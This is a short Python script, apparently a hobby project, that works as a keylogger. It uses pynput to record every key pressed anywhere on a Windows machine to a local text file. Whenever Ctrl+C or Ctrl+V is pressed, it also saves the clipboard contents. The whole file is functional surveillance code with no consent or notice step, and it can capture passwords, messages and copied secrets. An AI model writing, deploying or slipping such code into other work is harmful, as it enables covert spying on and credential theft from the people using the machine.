from pynput import keyboard
from win32 import win32clipboard
import pyperclip
import time
import threading




def printKeyPress(key):
    

    # if any((keyPressed in current) for keyPressed in COMBINATION):
    if (key == keyboard.KeyCode(char = '\x03') or key == keyboard.KeyCode(char = '\x16')):
        oldclip = pyperclip.paste() 
        data = pyperclip.paste()

        if oldclip == data:
            try:
                pyperclip.waitForNewPaste(0.1)
            except pyperclip.PyperclipTimeoutException:
                pass
            data = pyperclip.paste()
        
        with open("recorcording.txt", mode='a') as f:
            f.write(data)
            f.write('\n')
            f.close()
        print(data)
    else:
        with open("recorcording.txt", mode='a') as f:
            f.write(str(key))
            f.write('\n')
            f.close()

with keyboard.Listener(on_press=printKeyPress) as Listener:
    Listener.join()


